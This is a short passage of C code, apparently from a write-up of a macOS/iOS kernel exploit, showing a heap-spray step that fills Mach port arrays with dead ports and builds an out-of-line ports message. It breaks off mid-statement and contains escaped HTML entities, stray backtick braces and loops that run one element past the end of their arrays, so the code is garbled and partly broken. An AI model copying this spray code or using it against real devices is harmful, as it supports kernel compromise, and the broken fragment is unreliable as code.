    // Part 2. Create Message Buffer (Spray)
    mach_port_t* use_ports = calloc(1024, sizeof(mach_port_t));
    for(int i = 0; i &lt;= 1024; i++)`{`
        use_ports[i] = MACH_PORT_DEAD;
    `}`
    /* Set MSG HEADER */
    send_msg.msg_head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    send_msg.msg_head.msgh_size = sizeof(struct ool_send_msg) - 16;
    send_msg.msg_head.msgh_remote_port = MACH_PORT_NULL;
    send_msg.msg_head.msgh_local_port = MACH_PORT_NULL; // NULL SEND
    send_msg.msg_head.msgh_reserved = 0x00;
    send_msg.msg_head.msgh_id = 0x00;
    
    /* SET MSG BODY */
    send_msg.msg_body.msgh_descriptor_count = 1;
    
    /* SET MSG OOL PORT DESCRIPTOR */
    for(int i = 0; i&lt;=16; i++)`{` // appropriate ipc-send size  
        send_msg.msg_ool_ports[i].address&amp;
```
